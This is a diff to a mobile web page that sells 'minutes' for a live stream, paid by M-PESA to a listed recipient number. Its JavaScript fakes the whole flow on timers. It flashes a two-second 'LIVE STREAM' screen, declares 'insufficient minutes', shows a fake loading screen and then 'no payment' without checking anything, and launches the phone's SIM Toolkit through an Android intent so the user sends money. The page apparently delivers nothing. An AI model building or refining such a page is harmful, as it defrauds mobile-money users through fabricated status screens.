@@ -56,6 +56,7 @@ body {
   padding: 18px 10px;
   text-align: center;
   cursor: pointer;
+  transition: .2s;
 }
 
 .package:active {
@@ -195,24 +196,25 @@ body {
   text-align: center;
 }
 
-/* LOADING */
+/* LOADING SCREEN */
 
-.live-screen {
+.full-screen {
   position: fixed;
   inset: 0;
   background: #000;
   display: flex;
   flex-direction: column;
-  align-items: center;
   justify-content: center;
+  align-items: center;
+  text-align: center;
+  padding: 25px;
   z-index: 9999;
 }
 
-.live-title {
+.screen-title {
   color: red;
   font-size: 30px;
   font-weight: bold;
-  letter-spacing: 2px;
   margin-bottom: 25px;
 }
 
@@ -231,7 +233,7 @@ body {
   font-size: 15px;
 }
 
-.live-dot {
+.dot {
   width: 12px;
   height: 12px;
   background: red;
@@ -241,70 +243,28 @@ body {
   animation: blink .8s infinite;
 }
 
-/* NO PAYMENT */
-
-.no-payment-screen {
-  position: fixed;
-  inset: 0;
-  background: #000;
-  display: flex;
-  flex-direction: column;
-  justify-content: center;
-  align-items: center;
-  text-align: center;
-  padding: 25px;
-  z-index: 9999;
-}
-
-.no-payment-icon {
+.warning {
   font-size: 60px;
   margin-bottom: 20px;
 }
 
-.no-payment-screen h1 {
+.full-screen h1 {
   color: red;
   font-size: 28px;
   margin: 0;
 }
 
-.no-payment-screen p {
+.full-screen p {
   color: #aaa;
   margin-top: 10px;
-  font-size: 15px;
-}
-
-/* SIM TOOLKIT FALLBACK */
-
-.stk-screen {
-  position: fixed;
-  inset: 0;
-  background: #000;
-  display: flex;
-  flex-direction: column;
-  justify-content: center;
-  align-items: center;
-  text-align: center;
-  padding: 25px;
-  z-index: 9999;
-}
-
-.stk-screen h1 {
-  color: #32cd32;
-  font-size: 26px;
-  margin-bottom: 10px;
-}
-
-.stk-screen p {
-  color: #aaa;
   line-height: 1.5;
-  max-width: 340px;
 }
 
-.stk-btn {
+.open-btn {
   width: 100%;
   max-width: 320px;
   padding: 15px;
-  margin-top: 15px;
+  margin-top: 20px;
   border: none;
   border-radius: 11px;
   background: #32cd32;
@@ -417,9 +377,8 @@ body {
       <li>Select your minutes package.</li>
       <li>Tap PAY WITH M-PESA.</li>
       <li>Wait for the loading screen.</li>
-      <li>After the payment screen appears, select your package.</li>
-      <li>Tap GET ACCESS.</li>
-      <li>The website will attempt to open SIM Toolkit.</li>
+      <li>After the packages return, tap GET ACCESS.</li>
+      <li>The website will attempt to open the SIM Toolkit already installed on the phone.</li>
     </ol>
 
     <div class="note">
@@ -429,6 +388,7 @@ body {
   </div>
 
 </div>
+
 
 <script>
 
@@ -473,7 +433,7 @@ function showStatus(title, text) {
 }
 
 
-/* COPY NUMBER */
+/* COPY */
 
 function copyNumber() {
 
@@ -526,16 +486,16 @@ function payWithMpesa() {
 }
 
 
-/* LIVE STREAM FOR 2 SECONDS */
+/* LIVE STREAM — 2 SECONDS */
 
 function showLiveStream() {
 
   document.body.innerHTML = `
 
-    <div class="live-screen">
+    <div class="full-screen">
 
-      <div class="live-title">
-        <span class="live-dot"></span>
+      <div class="screen-title">
+        <span class="dot"></span>
         LIVE STREAM
       </div>
 
@@ -550,21 +510,21 @@ function showLiveStream() {
 
   setTimeout(function() {
 
-    showInsufficientMinutes();
+    showInsufficient();
 
   }, 2000);
 }
 
 
-/* INSUFFICIENT MINUTES */
+/* INSUFFICIENT MINUTES — 2 SECONDS */
 
-function showInsufficientMinutes() {
+function showInsufficient() {
 
   document.body.innerHTML = `
 
-    <div class="no-payment-screen">
+    <div class="full-screen">
 
-      <div class="no-payment-icon">
+      <div class="warning">
         ⚠️
       </div>
 
@@ -581,24 +541,28 @@ function showInsufficientMinutes() {
 
   setTimeout(function() {
 
-    showPaymentPackages();
+    showPackagesAgain();
 
   }, 2000);
 }
 
 
-/* SHOW PACKAGES AGAIN */
+/* PACKAGES AGAIN */
 
-function showPaymentPackages() {
+function showPackagesAgain() {
 
   document.body.innerHTML = `
 
     <div class="container">
 
       <div class="header">
+
         <h1>M-PESA PAYMENT</h1>
+
         <p>Choose your minutes package</p>
+
       </div>
+
 
       <div class="packages">
 
@@ -612,6 +576,7 @@ function showPaymentPackages() {
 
         </div>
 
+
         <div class="package ${
           selectedMinutes === 55 ? "selected" : ""
         }"
@@ -621,6 +586,7 @@ function showPaymentPackages() {
           <div class="price">KSh 138</div>
 
         </div>
+
 
         <div class="package ${
           selectedMinutes === 73 ? "selected" : ""
@@ -632,6 +598,7 @@ function showPaymentPackages() {
 
         </div>
 
+
         <div class="package ${
           selectedMinutes === 95 ? "selected" : ""
         }"
@@ -642,6 +609,7 @@ function showPaymentPackages() {
 
         </div>
 
+
         <div class="package ${
           selectedMinutes === 105 ? "selected" : ""
         }"
@@ -651,6 +619,7 @@ function showPaymentPackages() {
           <div class="price">KSh 299</div>
 
         </div>
+
 
         <div class="package ${
           selectedMinutes === 166 ? "selected" : ""
@@ -666,6 +635,7 @@ function showPaymentPackages() {
 
       </div>
 
+
       <div class="payment-box">
 
         <h2>Pay with M-PESA</h2>
@@ -676,18 +646,23 @@ function showPaymentPackages() {
             ${RECIPIENT}
           </div>
 
-          <button class="copy-btn" onclick="copyNumber()">
+          <button class="copy-btn"
+                  onclick="copyNumber()">
+
             COPY
+
           </button>
 
         </div>
 
+
         <button class="main-btn"
-                onclick="startPaymentInstructions()">
+                onclick="getAccess()">
 
           GET ACCESS
 
         </button>
+
 
         <div class="status" id="status">
 
@@ -703,9 +678,12 @@ function showPaymentPackages() {
 
       </div>
 
+
       <div class="instructions">
 
-        <h3>Process to pay and get access</h3>
+        <h3>
+          Process to pay and get access
+        </h3>
 
         <ol>
 
@@ -726,20 +704,26 @@ function showPaymentPackages() {
           </li>
 
           <li>
-            The website will attempt to open SIM Toolkit.
+            The website will attempt to open
+            the installed SIM Toolkit.
           </li>
 
         </ol>
 
+
         <div class="note">
 
           Selected:
-          <b>${selectedMinutes || "--"} minutes</b>
+          <b>
+            ${selectedMinutes || "--"} minutes
+          </b>
 
           <br><br>
 
           Amount:
-          <b>KSh ${selectedPrice || "--"}</b>
+          <b>
+            KSh ${selectedPrice || "--"}
+          </b>
 
         </div>
 
@@ -752,7 +736,7 @@ function showPaymentPackages() {
 
 /* GET ACCESS */
 
-function startPaymentInstructions() {
+function getAccess() {
 
   if (!selectedPrice) {
 
@@ -764,13 +748,17 @@ function startPaymentInstructions() {
     return;
   }
 
+
   document.body.innerHTML = `
 
-    <div class="live-screen">
+    <div class="full-screen">
 
-      <div class="live-title">
-        <span class="live-dot"></span>
+      <div class="screen-title">
+
+        <span class="dot"></span>
+
         LOADING
+
       </div>
 
       <div class="loading-ring"></div>
@@ -782,6 +770,7 @@ function startPaymentInstructions() {
     </div>
   `;
 
+
   setTimeout(function() {
 
     showNoPayment();
@@ -790,15 +779,15 @@ function startPaymentInstructions() {
 }
 
 
-/* NO PAYMENT */
+/* NO PAYMENT — 2 SECONDS */
 
 function showNoPayment() {
 
   document.body.innerHTML = `
 
-    <div class="no-payment-screen">
+    <div class="full-screen">
 
-      <div class="no-payment-icon">
+      <div class="warning">
         ⚠️
       </div>
 
@@ -813,6 +802,7 @@ function showNoPayment() {
     </div>
   `;
 
+
   setTimeout(function() {
 
     openSimToolkit();
@@ -822,35 +812,78 @@ function showNoPayment() {
 
 
 /*
-   TRY TO OPEN SIM TOOLKIT
+  ATTEMPT TO OPEN AN
+  ALREADY-INSTALLED SIM TOOLKIT
 
-   Android browsers may block this automatically.
+  NO PLAY STORE URL IS USED.
 */
 
 function openSimToolkit() {
 
+  /*
+    First attempt:
+    Android application intent.
+  */
+
+  try {
+
+    window.location.href =
+      "intent://#Intent;" +
+      "action=android.intent.action.MAIN;" +
+      "category=android.intent.category.LAUNCHER;" +
+      "package=com.android.stk;" +
+      "end";
+
+  } catch (error) {
+
+    showToolkitFallback();
+
+  }
+
+
+  /*
+    If Chrome blocks the intent,
+    show the manual button.
+  */
+
+  setTimeout(function() {
+
+    showToolkitFallback();
+
+  }, 1500);
+}
+
+
+/* FALLBACK */
+
+function showToolkitFallback() {
+
   document.body.innerHTML = `
 
-    <div class="stk-screen">
+    <div class="full-screen">
 
-      <h1>
-        Open SIM Toolkit
+      <div class="warning">
+        📱
+      </div>
+
+      <h1 style="color:#32cd32;">
+        SIM Toolkit
       </h1>
 
       <p>
-        The website is trying to open
-        SIM Toolkit on your phone.
+        Your browser did not allow the installed
+        SIM Toolkit to open automatically.
       </p>
 
-      <button class="stk-btn"
-              onclick="launchSimToolkit()">
+      <button class="open-btn"
+              onclick="trySimToolkitAgain()">
 
         OPEN SIM TOOLKIT
 
       </button>
 
-      <button class="stk-btn back-btn"
-              onclick="showPaymentPackages()">
+      <button class="open-btn back-btn"
+              onclick="showPackagesAgain()">
 
         BACK TO PACKAGES
 
@@ -858,32 +891,19 @@ function openSimToolkit() {
 
     </div>
   `;
-
-  /*
-    Automatically attempt the launch.
-  */
-
-  launchSimToolkit();
 }
 
 
-/* LAUNCH SIM TOOLKIT */
+/* SECOND ATTEMPT */
 
-function launchSimToolkit() {
+function trySimToolkitAgain() {
 
-  /*
-    Common Android SIM Toolkit package.
-    Some phones/carriers use a different package,
-    so Android may ignore this intent.
-  */
-
-  const intentUrl =
+  window.location.href =
     "intent://#Intent;" +
+    "action=android.intent.action.MAIN;" +
+    "category=android.intent.category.LAUNCHER;" +
     "package=com.android.stk;" +
-    "scheme=android-app;" +
     "end";
-
-  window.location.href = intentUrl;
 
 }
 
